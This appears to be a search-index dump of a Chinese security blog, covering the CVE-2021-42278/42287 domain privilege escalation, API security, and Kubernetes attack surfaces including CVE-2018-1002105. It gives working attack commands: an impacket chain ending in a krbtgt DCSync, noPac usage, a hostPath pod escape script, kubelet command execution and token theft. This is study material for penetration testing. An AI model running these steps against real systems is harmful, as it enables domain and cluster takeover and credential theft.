[{"categories":["内网渗透"],"content":"sAMAccountName spoofing","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/","tags":["域安全","内网渗透"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["内网渗透"],"content":"sAMAccountName spoofing ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:0:0","tags":["域安全","内网渗透"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["内网渗透"],"content":"1 背景 2021 年 11 月，有两个漏洞 CVE-2021-42278 \u0026 CVE-2021-42287 被露，两个漏洞组合可导致域内普通用户权限提升至域管权限。 ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:1:0","tags":["域安全","内网渗透"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["内网渗透"],"content":"1.1 CVE-2021-42278 windows 域内的机器账户的名字以 $ 结尾，但 DC 没有对域内机器账户名做验证。与 CVE-2021-42287 结合使用，它允许攻击者冒充域控制器账户。 ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:1:1","tags":["域安全","内网渗透"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["内网渗透"],"content":"1.2 CVE-2021-42287 在 kerberos 认证过程中，用户要访问某个服务，在获取服务票据 ST 之前，需要申请 TGT票据。该漏洞的核心为：当请求的服务票 ST 没有被 KDC 找到时，KDC 会自动在尾部添加 $ 重新搜索。 如果 A 用户获得申请了 TGT，然后删除 A 用户或重命名 A 用户。并使用该 TGT 进行 S4U2self 以其它用户身份请求一张 ST 给他自己，导致 KDC 在 Account Database 中寻找 A$。如果帐户 A$ 存在，那么 A 就会像其他用户一样为 A$获得一张服务票据。 因此，机器账户改名为和 DC 机器账户一样，然后申请 TGT，接着把用户名修改掉，使得 DC 在 TGS_REP 时候找不到该账户，这时会用自己的密钥加密服务票据 ST，然后就是得到了一个高权限 ST。 ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:1:2","tags":["域安全","内网渗透"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["内网渗透"],"content":"2 漏洞复现 前提：需要对属性 sAMAccountName 和 servicePrincipalName 具有写权限。由于默认情况下 MAQ 特性，域内普通用户可以创建 10 个机器账户，而创建者对于机器账户具有写权限，当然可以更改这两个属性。 首先创建一个机器账户，使用 impacket 的 addcomputer.py 或是 powermad 技巧 addcomputer.py 是利用 SAMR协议 创建机器账户，这个方法所创建的机器账户没有 SPN，所以可以不用清除。 然后清除机器账户的 servicePrincipalName 属性 将机器账户的 sAMAccountName，更改为 DC 的机器账户名字，注意后缀不带 $ 为机器账户请求 TGT 将机器账户的 sAMAccountName 更改为其他名字，不与步骤 3 重复即可 通过 S4U2self 协议向 DC 请求 ST DCsync 步骤如下： # 0. create a computer account addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword' # 1. clear its SPNs addspn.py -u 'domain\\user' -p 'password' -t 'ControlledComputer$' -c DomainController # 2. rename the computer (computer -\u003e DC) renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password' # 3. obtain a TGT getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword' # 4. reset the computer name renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password' # 5. obtain a service ticket with S4U2self by presenting the previous TGT KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController' # 6. DCSync by presenting the service ticket KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local' 武器化工具地址：https://github.com/cube0x0/noPac 扫描：noPac.exe scan -domain pentest.lab -user win11user -pass P@ssword 利用： noPac.exe scan -domain pentest.lab -user win11user -pass P@ssword /dc dc.pentest. lab /mAccount demol /mPassword pAss123! /service cifs /ptt 查看内存中的票据，发现已经存在 dc 的 cifs 服务票据： Dcsync： ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:2:0","tags":["域安全","内网渗透"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["内网渗透"],"content":"3 缓解措施 微软官方已推出补丁：KB5008602、KB5008380 通过域控的 ADSI 编辑器工具将 AD 域的 MAQ 配置为 0，中断此漏洞的利用链。 ","date":"2021-12-12","objectID":"/2021/12/samaccountname-spoofing/:3:0","tags":["域安全","内网渗透"],"title":"sAMAccountName spoofing","uri":"/2021/12/samaccountname-spoofing/"},{"categories":["云原生安全"],"content":"API 安全","date":"2021-12-05","objectID":"/2021/12/api%E5%AE%89%E5%85%A8/","tags":["云原生安全","API"],"title":"API 安全","uri":"/2021/12/api%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"API 安全 ","date":"2021-12-05","objectID":"/2021/12/api%E5%AE%89%E5%85%A8/:0:0","tags":["云原生安全","API"],"title":"API 安全","uri":"/2021/12/api%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"1 背景 API 安全通过对 API 通信行为的采集、监控、防御等手段，发现并收敛 API 生产过程中的风险，拦截针对 API 的漏洞攻击及数据窃取行为，最终围绕 API 的设计、开发、测试、运行、下线等不同阶段建立 API 全生命周期安全管理方案，为万物互联时代的数据交换、大规模分布式架构、云计算、IT 数字化改造提供安全保障。 ","date":"2021-12-05","objectID":"/2021/12/api%E5%AE%89%E5%85%A8/:1:0","tags":["云原生安全","API"],"title":"API 安全","uri":"/2021/12/api%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"1.1 API Security Top 10 2019 API 1 - 失效的对象级授权 API 2 - 失效的用户认证 API 3 - 过度的数据暴露 API 4 - 资源缺失 \u0026 速率限制 API 5 -功能级别授权已损坏 API 6 -批量分配 API 7 - 安全性错误配置 API 8 –注入 API 9 - 资产管理不当 API 10 - 日志和监控不足 ","date":"2021-12-05","objectID":"/2021/12/api%E5%AE%89%E5%85%A8/:1:1","tags":["云原生安全","API"],"title":"API 安全","uri":"/2021/12/api%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"容器编排平台的风险分析","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"K8s 安全 ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:0:0","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"1 背景 Kubernetes，简称为 K8s，是一个开源的容器化应用自动部署、伸缩和管理平台，已经成为容器编排的事实标准。 ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:1:0","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"1.1 Kubernetes 一个 Kubernetes 集群包含若干台服务器。其中，用于运行容器化应用的服务器被称为工作节点（worker node）； 用于运行控制平面（control plane）组件的服务器被称为控制节点或主节点（master node）。 在计算资源充足的情况下，工作节点和控制节点并不重合，控制平面组件只运行在控制节点上，业务容器运行在工作节点上，以满足高可用的需求。然而，为了达到充分利用服务器资源的目的（或单节点集群的情况），有时也会允许控制节点上运行业务容器。 其中，Master Node 中包含： API Server 这是 Kubernetes 控制面板中唯一带有用户可访问 API 以及用户可交互的组件。API 服 务器会暴露一个 RESTful 的 Kubernetes API 并使用 JSON 格式的清单文件(manifest files)。 etcd 这是一个强大的、稳定的、高可用的键值存储，被 Kubernetes 用于长久储存所有的 API 对象。 Controller Manager 被称为“kube-controller manager”，它运行着所有处理集群日常任务的控制器。包括了节点控制器、副本控制器、端点(endpoint)控制器以及服务账户等。 Scheduler 调度器会监控新建的 pods(一组或一个容器)并将其分配给节点。 在 Worker Node 中包含： Kubelet 负责调度到对应节点的 Pod 的生命周期管理，执行任务并将 Pod 状态报告给主节 点的渠道，通过容器运行时(拉取镜像、启动和停止容器等)来运行这些容器。它 还会定期执行被请求的容器的健康探测程序。 kube-proxy 它负责节点的网络，在主机上维护网络规则并执行连接转发。它还负责对正在服务 的 pods 进行负载平衡。 在绿盟的针对容器的渗透测试方法一文中指出一些渗透测试思路和方法。结合一般的渗透过程，梳理出一个针对 Kubernetes 的渗透测试流程： Kubernetes 控制平面组件通常运行在控制节点上；另外，对容器逃逸后通常能够获得容器所在宿主机上的 root 权限。将这两点结合起来我们会发现，如果前期进行 Web 渗透的目标容器位于控制节点上，且成功从容器中逃逸，那么我们实际上能够凭借控制节点上的 Kubernetes 管理员凭证（kubeconfig）与 Kubernetes API Server 进行交互（甚至可以直接使用控制节点上的 kubectl 命令行工具）。 ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:1:1","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"1.2 组件接口存在的风险 k8s 中的大多数组件以 HTTP 和 HTTPS 的 API 形式提供服务，常见端口如下： 组件 默认端口 说明 API Server 6443 基于 HTTP 的安全端口 API Server 8080 不安全的 HTTP 端口 Kubelet 10248 检查健康状态的端口 Kubelet 10250 面向 API Server 提供服务的 HTTPS 端口 Dashboard 8001 提供 HTTP 服务的端口 etcd 2379 客户端与服务端之间通信的端口 etcd 2380 不同服务端之间通信的端口 1.2.1 API Server 默认情况下，API Server 在 8080 和 6443 两个端口上提供服务。 其中，8080 端口提供的是没有 TLS 加密的 HTTP 服务，且所有到达该端口的请求将绕过所有认证和授权模块（但是仍然会被准入控制模块处理）。保留该端口主要是为了方便测试以及集群初启动。 然而在生产环境开放 8080 端口，即使绑定本地环回地址也是很危险的。如果将该端口暴露在互联网上，那么任何网络可达的攻击者都能够通过该端口直接与 API Server 交互，继而控制整个集群。 相比之下，6443 端口提供的是使用 TLS 加密的 HTTPS 服务，到达的请求必须通过认证和授权机制才能够被成功处理。在认证和授权机制配置正确的情况下，6443 端口提供的服务安全性会更高。 1.2.2 Dashboard 在按照官方文档所给方式部署完成 Dashboard 后，默认情况下，我们需要先执行 kube proxy，然后才能通过本地 8001 端口访问 Dashboard。但是，如果直接将 Dashboard 端口映射在宿主机节点上，或者在执行 kube proxy 指定了额外的地址参数，那么所有能够访到宿主机的用户，都能够直接访问 Dashboard。 # 存在风险的配置方式 kube proxy --address 0.0.0.0 --accept-host='^*$' 另外，默认情况下 Dashboard 需要登录认证，但是，如果用户在 Dashboard 的启动参数中添加了 --enable-skip-login 选项，那么攻击者就能够直接点击 Dashboard 界面的“跳过”，按钮，无须登录便可直接进入 Dashboard。 1.2.3 Kubelet API Server 是整个 Kubernetes 的中枢，以 RESTful API 的形式对外提供了大量应用接口。 事实上，Kubelet 也提供了 RESTful API 服务，供 API Server 调用以获取或改变某个 Kubernetes 节点上的资源状态。然而，这些 API 的设计意图并非是对外服务，因此官方并没有给出 Kubelet 的 API 文档。 默认配置下，Kubelet 在 10250 端口开放上述 API 服务，另外还监听 10248 端口，以供 其它组件检查 Kubelet 的运行状态： curl http://localhost:10248/healthz 10248 端口的服务相对简单，不存在特别的风险。但10250 端口却存在一定风险。默认情况下 API Server 在访问 Kubelet 的API 时需要使用客户端证书，相对来说是比较安全的。但是如果出现以下任一情况： 攻击者通过某种方式获取了 API Server 访问 Kubelet 的客户端证书。 用户为了方便起见，将 Kubelet 的 --anonymous-auth 参数设置为 true， 且 authorization.mode 设置为 AlwaysAllow。 则网络可达的攻击者都能够直接与 Kubelet 进行交互，从而实现对其所在节点的控制。 1.2.4 etcd Kubernetes 集群内的各种资源及其状态均存储在 etcd 中。如果能够有办法读取 etcd 中的数据，就可能获取高权限，从而控制集群。 目前，etcd 启动后监听 2379 和 2380 两个端口，前者用于客户端连接，后者用于多个 etcd 实例之间的端对端通信。在多节点集群中，为了实现高可用，etcd 往往在节点 IP 上进行监听，已实现多节点的互通。 默认情况下，两个端口提供的服务都需要相应证书才能访问，并禁止匿名访问，来保证安全性。如果攻击者获取了证书，或者允许匿名访问，就可以直接获取 ectd 内的数据。 etcdctl --endpoints https://localhost:2379 --cert /etc/kubernetes/pki/etcd/server.crt --key /etc/kubernetes/pki/etcd/server.key --cacert /etc/kubernetes/pki/etcd/ca.crt get /registry/serviceaccounts/kube-system/default -o json ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:1:2","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"2 k8s 组件配置不当的攻击案例 ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:2:0","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"2.1 API Server 未授权访问 默认情况下，API Server 能够在两个端口上对外提供服务：8080 和 6443，前者以 HTTP 提供服务，无认证和授权机制；后者以 HTTPS 提供服务，支持认证和授权服务。在较新版本的 Kubernetes 中，8080 端口的 HTTP 服务默认不启动。然而，如果用户在 /etc/kubernets/manifests/kube-apiserver.yaml 中将 --insecure-port=0 修改为 --insecure-port=8080 ，并重启 API Server，那么攻击者只要网络可达，都能够通过此端口操控集群。 如远程列出目标机器上运行的 pod： kubectl -s $TARGETIP:8080 get pod 进一步创建挂载宿主机目录的 Pod 进行容器逃逸，获得宿主机权限，相关操作如下： #!/bin/bash cat \u003c\u003c EOF \u003e escape.yaml # attacker.yaml apiVersion: v1 kind: Pod metadata: name: attacker spec: containers: - name: ubuntu image: ubuntu:latest imagePullPolicy: IfNotPresent # Just spin \u0026 wait forever command: [ \"/bin/bash\", \"-c\", \"--\" ] args: [ \"while true; do sleep 30; done;\" ] volumeMounts: - name: escape-host mountPath: /host-escape-door volumes: - name: escape-host hostPath: path: / EOF kubectl -s TARGET-IP:8080 apply -f escape.yaml sleep 8 kubectl -s TARGET-IP:8080 exec -it attacker /bin/bash ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:2:1","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"2.2 Dashboard 未授权访问 Kubernetes Dashboard 是一个基于 Web 的 Kubernetes 用户界面。借助 Dashboard，能够获得当前集群中应用运行状态的概览，创建或修改 Kubernetes 资源。 根据官方文档，可以使用以下命令部署 Dashboard: kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.4.0/aio/deploy/recommended.yaml Dashboard 需要配置 token 才能够访问，但是提供了「跳过」选项。从 1.10.1 版本起，Dashboard 默认禁用了「跳过」按钮。然而，如果用户在运行 Dashboard 时添加了 --enable-skip-login，那么攻击者只要网络可达，就能进入 Dashboard： 使用上面的 recommended.yaml 创建 Dashboard 是可靠的。即使攻击者“跳过”认证直接登录，也几乎没有办法操作。 ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:2:2","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"2.3 Kubelet 未授权访问 在一个 Kubernetes 集群中，Kubelet 是主要的节点代理，运行在集群的每个节点上。它负责向 API Server 注册所在节点。 Kubelet 的配置文件是 /var/lib/kubelet/config.yaml。一般来说，我们在安装 Kubernetes 时会将 --anonymous-auth 设置为 false，并在 authorization 中选择 mode 为 Webhook。前一选项禁止匿名用户访问，后一选项则使 Kubelet 通过 API Server 进行授权（即使匿名用户能够访间，也几乎不具备任何权限)。 但是，一旦 --anonymous-auth 被设置为 true, 且 authorization.mode 被设置为 AlwaysAllow 这就非常危险了。 更改 config 文件后，重启 Kubelet：systemctl restart kubelet。 执行 curl -k -XPOST \"https://nodeip:10250/run/%namespace%/%pod_name%/%container_name%\" -d \"cmd=ls -la /\" 可以在对应容器里执行命令。 现在问题变成了如何确定 namespace、pod_name、container_name。访问 https://nodeip:10250/pods 。在 metadata.namespace 下的值为 namespace, metadata.name 下的值为 pod_name，spec.containers 下的 name 值为 container_name。 执行命令： 获取 Token： 通过 Token 获取 API Server 权限： kubectl --insecure-skip-tls-verify=true --server=\"https://ip:6443\" --token=\"eyJhbG......\" get secrets --all-namespaces ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:2:3","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"3 k8s 权限提升漏洞 - CVE-2018-1002105 CVE-2018-1002105 是一个 Kubernetes 的权限提升漏洞，允许攻击者在拥有集群内低权限的情况下提升权限至 Kubernetes API Server 权限，CVSS 3.x 评分为 9.8。 影响版本： Kubernetes v1.0.x-1.9.x Kubernetes v1.10.0-1.10.10 (fixed in v1.10.11) Kubernetes v1.11.0-1.11.4 (fixed in v1.11.5) Kubernetes v1.12.0-1.12.2 (fixed in v1.12.3) 简单来说，通过构造一个特殊的请求，攻击者能够借助 Kubernetes API Server 作为代理，建立一个到后端服务器的连接，进而以 Kubernetes API Server 的身份向后端服务器发送任意请求，实质上就是权限提升。 在多数环境下，为了成功利用漏洞，攻击者本身需要具备一定的权限，如对集群内一个 Pod 的 exec、attach 权限。然而，在集群中存在其他扩展 API Server (如 metrics-server)的情况下，只要允许匿名访问集群，攻击者就可能以置名用户的身份完成漏洞利用。 ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:3:0","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"3.1 背景 3.1.1 基于角色的访问控制 - RBAC Role-Based Access Control(RBAC) 是为不同用户赋予不同的角色，通过角色授权进行访问控制。要启用 RBAC，在启动 API Server 时设置 --authorization-mode 参数。 Kubernetes 提供了四种 RBAC 对象：Role、ClusterRole、Role Binding 和 ClusterRoleBinding。 其中，Role 和 ClusterRole 代表一系列权限的集合，一个 Role 资源通常是特定命名空间内某些权限的集合，ClusterRole 则是无命名空间限制的资源。 以官方文档中的例子，下面是一个 Role 的声明文件，它在默认的命名空间创建了一个名为 pod-reader 的角色，这角色的权限是能够对命名空间内部的 Pod 进行查看、事件监听和列举操作。 apiVersion:rbac.authorization.k8s.io/v1kind:Rolemetadata:namespace:defaultname:pod-readerrules:- apiGroups:[\"\"]# \"\" 标明 core API 组resources:[\"pods\"]verbs:[\"get\",\"watch\",\"list\"] RoleBinding 和 ClusterRoleBinding 则用来将 Role 和 ClusterRole 定义的权限赋予一个或一组特定的用户。 下面的例子中的 RoleBinding 将 pod-reader Role 授予在 default 命名空间中的用户 jane。 这样，用户 jane 就具有了读取 default 命名空间中 pods 的权限。 apiVersion:rbac.authorization.k8s.io/v1# 此角色绑定允许 \"jane\" 读取 \"default\" 名字空间中的 Podskind:RoleBindingmetadata:name:read-podsnamespace:defaultsubjects:# 你可以指定不止一个“subject（主体）”- kind:Username:jane# \"name\" 是区分大小写的apiGroup:rbac.authorization.k8s.ioroleRef:# \"roleRef\" 指定与某 Role 或 ClusterRole 的绑定关系kind:Role# 此字段必须是 Role 或 ClusterRolename:pod-reader # 此字段必须与你要绑定的 Role 或 ClusterRole 的名称匹配apiGroup:rbac.authorization.k8s.io 3.1.2 WebSocket WebSocket 是一种网络传输协议，可在单个 TCP 连接上进行全双工通信，使得客户端和服务器之间的数据交换变得更加简单，允许服务端主动向客户端推送数据。在 WebSocket API中，浏览器和服务器只需要完成一次握手，两者之间就可以创建持久性的连接，并进行双向数据传输。 一个典型的 Websocket 握手请求如下： 客户端请求： GET /chat HTTP/1.1 Host: server.example.com Upgrade: websocket Connection: Upgrade Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ== Origin: http://example.com Sec-WebSocket-Protocol: chat, superchat Sec-WebSocket-Version: 13 服务器回应： HTTP/1.1 101 Switching Protocols Upgrade: websocket Connection: Upgrade Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo= Sec-WebSocket-Protocol: chat 3.1.3 Kubernetes API Server API Server 通过 RESTful API 提供服务。除此之外，它还具有代理转发的功能，将外界对于部分 API的调用转发到后端实际执行这些 API 功能的组件上。例如，常用的对 pod 执行 exec 的操作就是 API Server 作为代理，将请求转发到对应节点的 Kubelet 上，由该 Kubelet 执行具体命令。这个过程还涉及从 HTTP 到 Websocket 的协议升级过程，API Server 能够作为代理维护一条 WebSocket 连接。 ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:3:1","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"3.2 分析 漏洞在 staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go 中。upgradeaware 主要处理 API Server 的代理逻辑。其中 ServerHTTP 函数用来处理代理请求。 // staging/src/k8s.io/apimachinery/pkg/util/proxy/upgradeaware.go // ServeHTTP handles the proxy request func (h *UpgradeAwareHandler) ServeHTTP(w http.ResponseWriter, req *http.Request) { if h.tryUpgrade(w, req) { return } if h.UpgradeRequired { h.Responder.Error(w, req, errors.NewBadRequest(\"Upgrade request required\")) return } ... } } 它在最开始调用了 tryUpgrade 函数，尝试进行协议升级。漏洞正存在于该函数的处理逻辑之中，跟进该函数。 首先，该函数要判断原始请求是否为协议升级请求（请求头中是否包含 Connection 和 Upgrade 项）： // tryUpgrade returns true if the request was handled. if !httpstream.IsUpgradeRequest(req) { glog.V(6).Infof(\"Request was not an upgrade\") return false } 接着，它建立了到后端服务的连接： if h.InterceptRedirects { glog.V(6).Infof(\"Connecting to backend proxy (intercepting redirects) %s\\n Headers: %v\", \u0026location, clone.Header) backendConn, rawResponse, err = utilnet.ConnectWithRedirects(req.Method, \u0026location, clone.Header, req.Body, utilnet.DialerFunc(h.DialForUpgrade), h.RequireSameHostRedirects) } else { glog.V(6).Infof(\"Connecting to backend proxy (direct dial) %s\\n Headers: %v\", \u0026location, clone.Header) clone.URL = \u0026location backendConn, err = h.DialForUpgrade(clone) } if err != nil { glog.V(6).Infof(\"Proxy connection error: %v\", err) h.Responder.Error(w, req, err) return true } defer backendConn.Close() 然后，tryUpgrade 函数进行了 HTTP Hijack 操作，简单来说，就是不再将 HTTP 连接处理委托给 Go 语言内置的处理流程，程序自身在 TCP 连接基础上进行 HTTP 交互，这是从 HTTP 升级到 WebSocket 的关键步骤之一： 随后，tryUpgrade 将后端针对上一次请求的响应返回给客户端： 函数的最后，客户端到后端服务的代理通道被建立起来。 // Proxy the connection. writerComplete := make(chan struct{}) readerComplete := make(chan struct{}) go func() { ... }() go func() { ... }() // Wait for one half the connection to exit. Once it does the defer will // clean up the other half of the connection. select { case \u003c-writerComplete: case \u003c-readerComplete: } glog.V(6).Infof(\"Disconnecting from backend proxy %s\\n Headers: %v\", \u0026location, clone.Header) return true 这是 API Server 视角下建立代理的流程。那么，在这个过程中，后端服务又是如何参与的呢？ 以 Kubelet 为例，当用户对某个 Pod 执行 exec 操作时，该请求经过上面 API Server 的代理，发给 Kubelet。 Kubelet 在初始化时会启动一个自己的 API Server（为便于区分，后文所有单独出现的 API Server 均指的是 Kubernetes API Server，用 Kubelet API Server 指代 Kubelet 内部的 API Server)。 Kubelet 启动时会注册一系列 API，/exec 就在其中（由 installDebuggingHandlers 函数注册），注朋的对应处理函数为： 具体代码如下：pkg/kubelet/server/server.go 当客户端发起一个对 Pod 执行 exec 操作的请求时，经过 API Server 的代理、Kubelet 的转发，最终客户端与 Pod 间建立起了连接。 问题可能出现在如下地方： 如果请求本身不具有相应 Pod 的操作权限，它在 API Server 环节就会被拦截下来，不会到达 Kubelet，这个处理没有问题。 如果请求本身具有相应 Pod 的操作权限，且请求符合 API 要求（URL 正确、参数齐全等)，API Server 建立起代理，Kubelet 将流量转发到 Pod 上，一条客户端到指定 Pod 的命令执行连接被建立，这也没有问题，因为客户端本身具有相应 Pod 的操作权限。 如果请求本身具有相应 Pod 的操作权限，但是发出的请求并不符合 API 要求（如参数指定错误等)，API Server 同样会建立起代理，将请求转发给 Kubelet，这种情况下会发生什么呢？ 上面代码的 694 行，在 Kubelet 的 /exec 处理函数 getExec 中，一个 Options 实例被创建，跟进 NewOptions 函数：pkg/kubelet/server/remotecommand/httpstream.go 在第 61 行，如果请求中 stdin、stdout 和 stderr 三个参数都没有给出，Options 实例将创建失败，getExec 函数将直接返回给客户端一个 http.StatusBadRequest 信息： if err != nil { utilruntime.HandleError(err) response.WriteError(http.StatusBadRequest, err) return } 回到上面的第三种情况。结合 API Server 中 tryUpgrade 代码可以发现，API Server 并没有对这种错误情况进行处理，依然通过两个 Goroutine 为客户端到 Kubelet 建立了 Websocket 连接。问题的核心在于，这个连接并没有对接到某个 Pod 上（因为前面 getExec 失败返回了），也没有被销毁，客户端可以继续通过这个连接向 Kubelet 下发指令。由于经过了 API Server 的代理，因此指令是以 API Server 的权限向 Kubelet 下发的。也就是说，客户端自此能够自由向该 Kubelet 下发指令而不受限制，从而实现了权限提升，这就是 CVE-2018-1002105 漏洞的成因。 ","date":"2021-11-30","objectID":"/2021/11/k8s%E5%AE%89%E5%85%A8/:3:2","tags":["云原生安全","k8s"],"title":"K8s 安全","uri":"/2021/11/k8s%E5%AE%89%E5%85%A8/"},{"categories":["云原生安全"],"content":"3.3 复现 3.3.1 前置条件 正常请求执行的链路是 client --\u003e apiserver --\u003e kubelet 即 client 首先对 apiserver 发起请求，例如发送请求 [连接某一个容器并执行 exec] ，请求首先会被发到 apiserver，apiserver 收到请求后首先对该请求进行认证校验，如果此时使用的是匿名用户，api server 上是可以通过认证的，但会授权失败，即 client 只能走到 apiserver 而到不了 kubelet 就被返回 403 并断开连接了。 所以本次攻击的先决条件是，需要有一个可以从 client 到 apiserver 到 kubelet 整个链路通信认证通过的用户。 3.3.2 漏洞环境搭建 利用 metarget 安装漏洞环境： ./metarget cnv install cve-2018-1002105 --domestic 模拟攻击场景：集群中存在一个 vul 的命名空间，其中存在一个运行的业务 Pod。攻击者具有 vul 命名空间下 Pod 的 exec 权限，但是不具有其它高级权限。通过该漏洞进行提权。 创建 vul 命名空间 # cve_2018_1002105_namespace.yamlapiVersion:v1kind:Namespacemetadata:name:vul 创建角色 test，并赋予权限 # cve_2018_1002105_role.yamlapiVersion:rbac.authorization.k8s.io/v1kind:Rolemetadata:name:testnamespace:vulrules:- apiGroups:- \"\"resources:- podsverbs:- get- list- delete- watch- apiGroups:- \"\"resources:- pods/execverbs:- create- get 创建用户 test，并与角色 test 绑定 # cve_2018_1002105_role_binding.yamlapiVersion:rbac.authorization.k8s.io/v1kind:RoleBindingmetadata:name:testnamespace:vulroleRef:apiGroup:rbac.authorization.k8s.iokind:Rolename:testsubjects:- apiGroup:rbac.authorization.k8s.iokind:Groupname:test 在命名空间 vul 内创建测试业务 Pod： # cve_2018_1002105_pod.yamlapiVersion:v1kind:Podmetadata:name:testnamespace:vulspec:containers:- name:ubuntuimage:ubuntu:latestimagePullPolicy:IfNotPresent# Just spin \u0026 wait forevercommand:[\"/bin/bash\",\"-c\",\"--\"]args:[\"while true; do sleep 30; done;\"]serviceAccount:defaultserviceAccountName:default test-csv，用户 test 的认证凭证。Token, 用户名, UID, 用户组 password,test,test,test 分别应用上述 yaml：kubectl apply -f xxx 配置用户认证： cp test-csv.csv /etc/kubernetes/pki/test-role-token.csv 修改 API Server 配置文件 /etc/kubernetes/manifests/kube-apiserver.yaml 最后的结果： 检测是否部署成功： kubectl --token=password --server=https://129.226.12.58:6443 --insecure-skip-tls-verify exec -it test -n vul /bin/hostname kubectl --token=password --server=https://129.226.12.58:6443 --insecure-skip-tls-verify get pods -n kube-system 3.3.3 漏洞复现 目标：通过该漏洞，进行提权，创建一个挂载主机根目录的 Pod，实现容器逃逸。 # attacker.yamlapiVersion:v1kind:Podmetadata:name:attackerspec:containers:- name:ubuntuimage:ubuntu:latestimagePullPolicy:IfNotPresent# Just spin \u0026 wait forevercommand:[\"/bin/bash\",\"-c\",\"--\"]args:[\"while true; do sleep 30; done;\"]volumeMounts:- name:escape-hostmountPath:/host-escape-doorvolumes:- name:escape-hosthostPath:path:/ 思路： 构造错误请求，建立经 Kubernetes API Server 代理到 Kubelet 的高权限 WebSocket 连接。 利用高权限 Websocket 连接，向 Kubelet 发起 /runningpods/ 请求，获得当前活动 Pod 列表。 从活动 Pod 列表中找到 Kuberetes API Server 的 Pod 名称。 利用高权限 WebSocket 连接，向 Kubelet 发起 /exec 请求，指定 Pod 为上一步中获得的 Pod 名称，携带“利用 cat 命令读取 ca.crt”作为参数，从返回结果中保存窃取到的文件。 利用高权限 WebSocket 连接，向 Kubelet 发起 /exec 请求，指定 Pod 为上一步中获得的 Pod 名称，携带“利用 cat 命令读取 apiserver-kubelet-client.crt ”作为参数，从返回结果中保存窃取到的文件。 利用高权限 WebSocket 连接，向 Kubelet 发起 /exec 请求，指定 Pod 为上一步中获得的 Pod 名称，携带“利用 cat 命令读取 apiserver-kubelet-client.key”作为参数，从返回结果中保存窃取到的文件 使用 kubectl 命令行工具，指定访问凭证为第 4、5、6 